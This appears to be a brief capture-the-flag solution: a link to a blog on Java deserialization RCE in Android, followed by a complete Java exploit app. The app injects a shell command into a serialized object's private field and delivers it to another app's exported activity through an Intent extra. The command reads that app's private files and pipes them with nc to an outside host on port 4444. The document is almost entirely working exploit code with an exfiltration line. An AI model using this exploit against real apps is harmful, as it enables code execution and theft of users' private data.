https://shivasurya.me/security/android/android-security/2024/01/24/java-deserialization-rce-android-application-layer.html

Derserialization in intent Extras

```java
package com.dimas.lookupexploit;

import android.content.Intent;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import com.dimas.lookup.Testing;
import com.dimas.lookup.Testing2;

import java.lang.reflect.Field;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent();
        Bundle bundle = new Bundle();
        String cmd = "sh -c $@|sh . echo (cat /data/data/com.dimas.lookup/files/*) | nc playground.tcp1p.team 4444";
        Testing2 testing2 = getTesting2(cmd);
        bundle.putSerializable("foo", testing2);
        intent.setClassName("com.dimas.lookup", "com.dimas.lookup.RealTimeUpdateActivity");
        intent.putExtras(bundle);
        startActivity(intent);
    }

    @NonNull
    private static Testing2 getTesting2(String cmd) {
        Testing testing = new Testing();
        try {
            Field field = testing.getClass().getDeclaredField("cmd");
            field.setAccessible(true);
            field.set(testing, cmd);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        Testing2 testing2 = new Testing2();
        try {
            Field field = testing2.getClass().getDeclaredField("object");
            field.setAccessible(true);
            field.set(testing2, testing);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        return testing2;
    }
}
```
